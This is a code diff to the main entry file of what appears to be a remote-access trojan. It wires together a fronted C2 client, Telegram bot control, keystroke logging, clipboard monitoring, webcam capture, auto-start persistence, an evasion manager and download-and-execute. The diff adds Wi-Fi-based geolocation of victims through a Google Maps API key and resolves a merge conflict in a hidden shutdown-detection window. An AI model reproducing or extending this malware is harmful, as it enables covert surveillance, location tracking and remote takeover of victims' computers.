@@ -39,6 +39,7 @@
 #include "infrastructure/c2/FrontedC2Client.hpp"
 #include "infrastructure/media/OpenCVMediaCapture.hpp"
 #include "infrastructure/network/IPGeolocationService.hpp"
+#include "infrastructure/network/WiFiGeolocationService.hpp"
 #include "infrastructure/system/ActivityLogger.hpp"
 
 using namespace nuub;
@@ -93,6 +94,7 @@ class ProcessService : public application::interfaces::IProcessService {
 };
 class WifiService : public application::interfaces::IWifiService {
     std::string get_saved_networks() override { return "Linux wifi not implemented"; }
+    std::vector<application::interfaces::WifiAccessPoint> get_visible_networks() override { return {}; }
 };
 class FileManagerService : public application::interfaces::IFileManagerService {
     std::string list_directory(const std::string&) override { return ""; }
@@ -244,6 +246,9 @@ int main(int argc, char* argv[]) {
             config.admin_chat_ids.push_back(config.admin_chat_id);
         }
 
+        if (j.contains("google_maps_api_key"))
+            config.google_maps_api_key = j["google_maps_api_key"].get<std::string>();
+
         if (config.telegram_bot_token.empty() || config.encryption_password.empty()) {
             throw std::runtime_error("Config: telegram_bot_token and encryption_password are required");
         }
@@ -306,7 +311,9 @@ int main(int argc, char* argv[]) {
     telegram.set_audit_log(config.audit_log_filename);
     KeyListener key_listener(keystroke_service);
     infrastructure::media::OpenCVMediaCapture media_capture(config.pc_identifier);
-    infrastructure::network::IPGeolocationService geolocation;
+    WifiService wifi_service;
+    infrastructure::network::WiFiGeolocationService geolocation(
+        wifi_service, config.google_maps_api_key);
     infrastructure::system::ActivityLogger activity_logger(
         config.activity_log_filename, config.pc_identifier);
     Persistence persistence(config.pc_identifier, config.auto_start_entry_name);
@@ -314,7 +321,6 @@ int main(int argc, char* argv[]) {
     SysInfoService sysinfo_service;
     ClipboardService clipboard_service;
     ProcessService process_service;
-    WifiService wifi_service;
     FileManagerService filemgr_service;
     DownloadExecService dl_service;
 
@@ -441,27 +447,12 @@ int main(int argc, char* argv[]) {
         telegram.start();
     });
 
-<<<<<<< HEAD
     // Hidden window for shutdown detection (WM_QUERYENDSESSION, WM_CLOSE, etc.)
     // Cleanup happens after pump_messages() returns, so this just breaks the loop.
 #ifdef _WIN32
     persistence.create_hidden_window([]() {
         spdlog::info("System shutdown signal received");
         PostQuitMessage(0);
-=======
-    // Hidden window for shutdown detection
-    persistence.create_hidden_window([&]() {
-        spdlog::info("Shutdown signal received");
-        activity_logger.register_event("SHUTDOWN");
-        persistence.stop_anti_sleep();
-        key_listener.stop();
-        clipboard_monitor.stop();
-        domain::EvasionManager::instance().shutdown();
-        telegram.stop();
-        if (c2_client) c2_client->stop();
-        spdlog::info("Agent shutting down");
-        std::exit(0);
->>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
     });
 #endif
 
